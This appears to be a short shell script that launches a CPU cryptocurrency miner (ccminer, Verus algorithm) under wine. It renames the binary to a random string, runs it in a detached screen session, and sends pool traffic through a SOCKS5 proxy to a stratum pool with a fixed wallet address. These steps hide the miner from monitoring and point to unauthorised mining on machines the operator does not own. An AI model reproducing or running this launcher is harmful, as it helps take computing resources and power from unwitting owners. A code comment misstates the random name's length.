chmod +x * 
cd ccminer_CPU_3.8.3 
proxy_url="socks5://ayoyojuhnk.biz.id:6201" 
random_name=$(tr -dc A-Za-z </dev/urandom | head -c 10)  # Menghasilkan nama acak sepanjang 8 karakter 
mv ccminer.exe $random_name.exe 
screen -d -m bash -c "wine $random_name.exe -a verus -o stratum+tcp://usw.vipor.net:5040 -u RAxQVenbK9dxYRRta1n1CtBtRW1GydoUNk.belotloh -p d=5 -t 4 --proxy=$proxy_url"
